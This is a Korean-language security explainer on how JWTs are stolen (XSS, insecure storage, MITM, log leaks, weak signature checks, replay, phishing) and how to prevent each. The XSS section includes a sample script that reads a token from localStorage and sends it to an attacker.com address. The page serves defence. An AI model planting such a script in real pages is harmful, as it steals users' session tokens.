---
Date: 2024-12-24
Category: Auth
---

JWT (JSON Web Token)는 보안에 강력한 도구이지만, **토큰이 노출되면 치명적인 보안 위협**이 발생할 수 있습니다.  
토큰 탈취는 주로 **애플리케이션, 네트워크, 사용자의 실수 등 다양한 경로**를 통해 발생합니다.

---

## 🛡️ **1. 클라이언트 측 취약점**

### ✅ **1.1 XSS (Cross-Site Scripting)**

- **설명:** 공격자가 웹 페이지에 악성 스크립트를 삽입하여 사용자의 브라우저에서 JWT를 탈취합니다.
- **공격 방법:**
    - 브라우저의 `localStorage`, `sessionStorage`, 또는 `cookie`에 저장된 토큰을 탈취.
    - 예시:

```javascript
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
</script>
```

- **예방 방법:**
    - 토큰을 `HttpOnly` 쿠키에 저장 (JavaScript 접근 불가).
    - 입력 값 검증 및 HTML 이스케이프.
    - CSP (Content Security Policy) 적용.

---

### ✅ **1.2 토큰 저장 방식 문제**

- **설명:** 토큰이 `localStorage`나 `sessionStorage`에 저장되면, 브라우저의 스크립트를 통해 접근이 가능합니다.
- **안전한 방법:**
    - **`HttpOnly` 쿠키를 사용** (JavaScript로 접근 불가).
    - `Secure` 플래그로 HTTPS 통신만 허용.

---

## 🌐 **2. 네트워크 취약점**

### ✅ **2.1 중간자 공격 (Man-in-the-Middle, MITM)**

- **설명:** 공격자가 클라이언트와 서버 간 통신을 가로채 JWT를 탈취합니다.
- **공격 방법:**
    - HTTPS가 아닌 HTTP로 통신.
    - 인증서 위변조.
- **예방 방법:**
    - **HTTPS 사용 필수.**
    - SSL/TLS 인증서 검증 강화.
    - HSTS (HTTP Strict Transport Security) 활성화.

---

### ✅ **2.2 로그 노출 (Logging Leak)**

- **설명:** 개발 중 토큰이 로그에 기록되어 노출될 수 있습니다.
- **예시:**

```plaintext
INFO: User login success, token=eyJhbGciOiJIUzI1NiIsIn...
```

- **예방 방법:**
    - 로그에 민감한 정보(토큰, 비밀번호) 포함 금지.
    - 보안 감사 및 로그 관리.

---

## 💻 **3. 서버 측 취약점**

### ✅ **3.1 잘못된 토큰 검증**

- **설명:** 서버가 토큰의 서명을 제대로 검증하지 않는 경우 공격자가 위조된 토큰으로 인증할 수 있습니다.
- **예시:**
    - 잘못된 비밀키 사용.
    - 서명 검증 미사용.
- **예방 방법:**
    - 반드시 **토큰 서명 검증**.
    - 비밀키를 안전하게 관리.
    - 잘못된 알고리즘 (예: `none`) 거부.

---

### ✅ **3.2 토큰 재사용 (Replay Attack)**

- **설명:** 공격자가 탈취한 JWT를 재사용하여 서버에 접근합니다.
- **예방 방법:**
    - **토큰 블랙리스트/화이트리스트** 관리.
    - 토큰 사용 시마다 만료 확인.
    - 토큰에 **jti (JWT ID)**를 추가하여 중복 사용 방지.

---

## 🧠 **4. 사용자 실수**

### ✅ **4.1 피싱 공격 (Phishing Attack)**

- **설명:** 사용자가 가짜 로그인 페이지에 토큰을 입력하여 탈취됩니다.
- **예방 방법:**
    - 사용자에게 공식 도메인을 안내.
    - 브라우저의 주소 표시줄 확인 강조.
    - 2FA (Two-Factor Authentication) 활성화.

---

### ✅ **4.2 공용 기기 사용**

- **설명:** 사용자가 로그아웃하지 않은 상태로 공용 기기(PC, 태블릿 등)를 사용한 경우.
- **예방 방법:**
    - 자동 로그아웃 기능 설정.
    - 로그아웃 후 토큰 무효화.
    - 보안 세션 관리.

---

## 📊 **탈취 경로 요약**

|**경로**|**설명**|**예방 방법**|
|---|---|---|
|**XSS**|브라우저에서 JavaScript로 토큰 접근|HttpOnly 쿠키, CSP 적용|
|**LocalStorage**|저장소를 통해 접근 가능|HttpOnly 쿠키 사용|
|**MITM**|통신 중간에서 토큰 탈취|HTTPS 강제, SSL/TLS 강화|
|**로그 노출**|토큰이 서버 로그에 노출됨|민감 정보 로깅 금지|
|**서명 검증 오류**|잘못된 알고리즘/서명 검증 미흡|강력한 서명 검증, 알고리즘 검증|
|**Replay Attack**|탈취한 토큰 재사용|블랙리스트/화이트리스트, `jti` 사용|
|**피싱**|가짜 로그인 페이지로 토큰 유출|공식 도메인 확인, 2FA 활성화|
|**공용 기기**|공용 기기에서 토큰 노출|자동 로그아웃, 세션 만료 관리|

---

## 🚀 **JWT 보안을 위한 Best Practice**

1. **HttpOnly, Secure 쿠키 사용:** JavaScript 접근 차단 및 HTTPS 강제.
2. **HTTPS 강제:** SSL/TLS로 네트워크 보안 강화.
3. **짧은 만료 시간 설정:** 액세스 토큰은 짧게, 리프레시 토큰은 상대적으로 길게.
4. **블랙리스트/화이트리스트 관리:** 로그아웃 또는 강제 만료 처리.
5. **알고리즘 검증:** JWT 서명 알고리즘 확인 (`none` 사용 금지).
6. **jti (JWT ID) 사용:** 토큰 중복 사용 방지.
7. **모니터링:** 의심스러운 로그인 활동 탐지.
8. **보안 테스트:** XSS, CSRF 취약점 검증.

---

## 🧠 **JWT 보안, 어디에 집중해야 할까?**

- **클라이언트:** XSS, 토큰 저장소 (`HttpOnly` 쿠키).
- **네트워크:** HTTPS 강제, SSL/TLS 인증서 확인.
- **서버:** 올바른 토큰 서명 검증, 짧은 토큰 만료 시간, 블랙리스트/화이트리스트 관리.
- **사용자:** 피싱 주의, 공용 기기 사용 금지.

---

### 🎯 **결론**

- JWT 자체는 안전합니다. **하지만 관리와 저장이 문제의 핵심입니다.**
- **XSS 공격과 네트워크 탈취를 가장 주의해야 합니다.**
- **HttpOnly Secure 쿠키 사용, HTTPS 강제, 올바른 서명 검증**을 통해 안전성을 보장할 수 있습니다.

---

더 궁금한 점이 있거나, 특정 보안 취약점에 대해 자세히 알고 싶다면 말씀해주세요! 🚀😊